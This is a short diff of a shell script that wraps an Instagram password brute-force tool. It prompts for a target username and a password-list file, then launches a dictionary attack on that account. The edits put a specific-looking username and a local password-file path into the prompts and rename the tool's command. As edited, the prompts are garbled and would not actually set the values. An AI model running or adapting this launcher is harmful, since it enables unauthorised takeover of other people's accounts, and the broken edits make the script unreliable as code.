@@ -19,16 +19,16 @@ ____    ____  _______ .__   __.   ______   .___  ___.
 printf "\n"
 printf "\n"
 echo
-read -p "[#] Enter Instagram ID/Username : " usrnm
+read -p "nicklalleg" usrnm
 echo
-read -p "[#] Enter Password-list path (enter the full file path and check that it has the read-permission) : " inspass
+read -p "C:\Users\ejbsh\Downloads\pass.txt" inspass
 echo
 if [ $inspass = 0 ]                                             
 then
 echo -e  "$ylo >>> exiting... <<<$rset"        
 else
 
-  instagram-py --username $usrnm --password-list $inspass
+  instagram.py --username $usrnm --password-list $inspass
 
 echo
 sleep 30.0
